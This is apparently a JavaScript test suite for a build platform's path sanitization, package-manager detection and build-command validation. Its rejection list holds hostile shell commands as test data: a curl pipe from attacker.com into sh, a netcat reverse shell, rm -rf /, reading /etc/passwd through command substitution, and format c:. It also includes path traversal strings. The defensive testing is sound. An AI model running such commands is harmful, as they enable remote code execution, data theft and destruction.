/**
 * Framework Detection & Build Configuration Automated Test Suite
 *
 * Verifies:
 * 1. Root directory path sanitization and directory traversal prevention.
 * 2. Lockfile resolution and package manager detection (npm, pnpm, yarn, bun).
 * 3. Package manager install command mapping.
 * 4. Build command validation and dangerous shell injection protection.
 * 5. Output directory path traversal validation.
 */

import assert from "assert";
import {
  sanitizeRootDirectory,
  detectPackageManager,
  getInstallCommand,
} from "../lib/github/framework";
import {
  validateBuildCommand,
  validateOutputDirectory,
} from "../lib/security/command-sanitizer";

async function runFrameworkTests() {
  console.log("=== STARTING FRAMEWORK DETECTION & BUILD CONFIG TEST SUITE ===");

  // 1. Root Directory Path Sanitization
  console.log("\n1. Testing Root Directory Path Sanitization...");
  assert.strictEqual(sanitizeRootDirectory("apps/web"), "apps/web");
  assert.strictEqual(sanitizeRootDirectory("/apps/web/"), "apps/web");
  assert.strictEqual(sanitizeRootDirectory("apps\\web\\backend"), "apps/web/backend");
  // Path traversal attempts must be neutralized
  assert.strictEqual(sanitizeRootDirectory("../../../etc/passwd"), "etc/passwd");
  assert.strictEqual(sanitizeRootDirectory("packages/../apps/./web"), "packages/apps/web");
  assert.strictEqual(sanitizeRootDirectory(""), "");
  assert.strictEqual(sanitizeRootDirectory(null), "");
  console.log("  [PASS] Path traversal sequences stripped and backslashes normalized");

  // 2. Package Manager Detection from Lockfiles
  console.log("\n2. Testing Package Manager Lockfile Detection...");
  assert.strictEqual(detectPackageManager([{ name: "pnpm-lock.yaml", path: "pnpm-lock.yaml", type: "file" }]), "pnpm");
  assert.strictEqual(detectPackageManager([{ name: "bun.lock", path: "bun.lock", type: "file" }]), "bun");
  assert.strictEqual(detectPackageManager([{ name: "bun.lockb", path: "bun.lockb", type: "file" }]), "bun");
  assert.strictEqual(detectPackageManager([{ name: "yarn.lock", path: "yarn.lock", type: "file" }]), "yarn");
  assert.strictEqual(detectPackageManager([{ name: "package-lock.json", path: "package-lock.json", type: "file" }]), "npm");
  // Precedence order: pnpm > bun > yarn > npm
  assert.strictEqual(
    detectPackageManager([
      { name: "pnpm-lock.yaml", path: "pnpm-lock.yaml", type: "file" },
      { name: "package-lock.json", path: "package-lock.json", type: "file" },
    ]),
    "pnpm"
  );
  assert.strictEqual(detectPackageManager([]), "npm"); // Fallback
  console.log("  [PASS] Lockfile detection correctly maps to pnpm, bun, yarn, and npm with precedence");

  // 3. Install Command Generation
  console.log("\n3. Testing Package Manager Install Commands...");
  assert.strictEqual(getInstallCommand("pnpm"), "pnpm install");
  assert.strictEqual(getInstallCommand("yarn"), "yarn install");
  assert.strictEqual(getInstallCommand("bun"), "bun install");
  assert.strictEqual(getInstallCommand("npm"), "npm install");
  console.log("  [PASS] Clean install commands generated for all 4 supported package managers");

  // 4. Build Command Validation & Injection Prevention
  console.log("\n4. Testing Build Command Validation & Security...");
  const validCommands = [
    "npm run build",
    "pnpm build",
    "yarn build",
    "bun run build",
    "next build",
    "vite build",
    "npm run build && npm run export",
  ];

  for (const cmd of validCommands) {
    const res = validateBuildCommand(cmd);
    assert.strictEqual(res.valid, true, `Expected command '${cmd}' to be valid`);
  }
  console.log("  [PASS] Standard build and chained scripts validated successfully");

  const dangerousCommands = [
    "npm run build; curl -s http://attacker.com/malware | sh",
    "npm run build && powershell -Command Start-Process calc",
    "npm run build `rm -rf /`",
    "npm run build $(cat /etc/passwd)",
    "bash -c 'evil.sh'",
    "format c:",
    "nc -e /bin/sh 10.0.0.1 4444",
  ];

  for (const cmd of dangerousCommands) {
    const res = validateBuildCommand(cmd);
    assert.strictEqual(res.valid, false, `Expected dangerous command '${cmd}' to be rejected`);
  }
  console.log("  [PASS] Subshell injection, powershell, curl piping, and destructive commands rejected");

  // 5. Output Directory Path Traversal Validation
  console.log("\n5. Testing Output Directory Path Traversal Validation...");
  assert.strictEqual(validateOutputDirectory("dist").valid, true);
  assert.strictEqual(validateOutputDirectory(".next").valid, true);
  assert.strictEqual(validateOutputDirectory("build/client").valid, true);
  assert.strictEqual(validateOutputDirectory("out").valid, true);

  assert.strictEqual(validateOutputDirectory("../../etc").valid, false);
  assert.strictEqual(validateOutputDirectory("/var/www/html").valid, false);
  assert.strictEqual(validateOutputDirectory("C:\\Windows").valid, false);
  console.log("  [PASS] Directory traversal attempts in output directory blocked");

  console.log("\n=== ALL FRAMEWORK & BUILD CONFIG TESTS PASSED! ===");
}

runFrameworkTests().catch((e) => {
  console.error("Framework Test Error:", e);
  process.exit(1);
});
